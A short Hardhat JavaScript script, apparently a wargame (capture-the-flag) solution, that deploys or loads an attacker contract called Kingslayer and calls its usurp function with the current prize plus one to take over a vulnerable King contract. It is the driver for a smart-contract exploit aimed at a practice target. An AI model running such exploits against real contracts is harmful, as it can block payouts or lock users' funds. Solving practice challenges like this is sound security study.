const hre = require("hardhat");
const deploy = require("./deploy").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const king = await ethers.getContractAt("King", process.env.KING_ADDR)

  const kingslayer = hre.network.name == "hardhat"
    ? await deploy()
    : await ethers.getContractAt("Kingslayer", process.env.KINGSLAYER_ADDR);

  const prize = await king.prize()

  console.log(`Prize: ${prize}`)
  const tx = await kingslayer.usurp(process.env.KING_ADDR, {
    value: prize + 1
  })

  await tx.wait()

  console.log(`King: ${await king._king()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
